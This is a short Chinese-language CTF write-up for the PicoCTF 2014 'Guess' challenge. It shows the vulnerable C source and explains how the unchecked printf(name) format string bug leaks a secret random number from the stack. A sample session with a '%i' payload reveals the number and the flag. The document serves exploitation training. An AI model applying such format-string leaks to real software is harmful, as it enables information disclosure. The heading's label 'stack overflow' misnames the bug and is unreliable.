# Pico CTF 2014 : Guess

## 原理

栈溢出。

## 目的

掌握PWN题目的大致流程。

## 环境

Ubuntu。

## 工具

gdb、objdump、python。

## 步骤

源代码可以下载，所以很容易发现：

    #include <stdio.h>
    #include <stdlib.h>

    char *flag = "~~FLAG~~";

    void main(){
        int secret, guess;
        char name[32];
        long seed;

        FILE *f = fopen("/dev/urandom", "rb");
        fread(&secret, sizeof(int), 1, f);
        fclose(f);

        printf("Hello! What is your name?\n");
        fgets(name, sizeof(name), stdin);

        printf("Welcome to the guessing game, ");
        printf(name);
        printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\n");

        printf("What is your guess?\n");
        scanf("%d", &guess);

        if(guess == secret){
    	printf("Wow! You guessed it!\n");
    	printf("Your flag is: %s\n", flag);
        }else{
    	printf("Hah! I knew you wouldn't get it.\n");
        }
    }

在第19行有一个printf（名称），这显然导致一个格式字符串可利用的错误。

该程序的功能非常简单，它的作用是打开一个文件，从中读取标志，然后生成一个随机数字，并要求你的名字。 然后它要求你猜测它产生的数字。

显然滥用格式字符串错误，我们可以从内存中泄漏信息，从堆栈读取数字并回复正确的答案，此时我们返回标志。

在本地使用gdb的机器上，可以非常精确地发现数字存储在堆栈中的位置，这是％14 $ i。 这并不适用于真正的目标，很可能是因为二进制是在不同的系统下编译的，但是有一点暴力的强迫，我最终可以工作

    $ ./guess
    Hello! What is your name?
    %i %i %i %i
    Welcome to the guessing game, 32 -143569888 160419848 765327463

    I generated a random 32-bit number.
    You have a 1 in 2^32 chance of guessing it. Good luck.
    What is your guess?
    765327463
    Wow! You guessed it!
    Your flag is: xctf{xxxxx}

## **[总结]**

掌握好做PWN题目的大致思路，学会寻找修改shellcode。
